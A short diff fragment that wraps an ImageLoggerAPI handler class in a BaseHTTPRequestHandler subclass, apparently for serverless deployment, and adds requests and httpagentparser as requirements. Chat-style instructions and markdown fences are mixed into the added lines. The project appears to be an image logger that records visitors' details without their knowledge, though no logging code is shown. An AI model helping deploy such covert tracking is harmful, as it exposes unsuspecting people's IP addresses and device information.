@@ -300,5 +300,22 @@ if (!currenturl.includes("g=")) {
     
     do_GET = handleRequest
     do_POST = handleRequest
+    
+# Keep all your existing code above unchanged, just replace the last line:
 
-handler = ImageLoggerAPI
+# DELETE THIS: handler = ImageLoggerAPI
+
+# ADD THIS instead:
+from http.server import BaseHTTPRequestHandler
+
+class handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        ImageLoggerAPI.handleRequest(self)
+    def do_POST(self):
+        ImageLoggerAPI.handleRequest(self)
+```
+
+**Also add `requirements.txt`** in your repo root if you don't have one:
+```
+requests
+httpagentparser
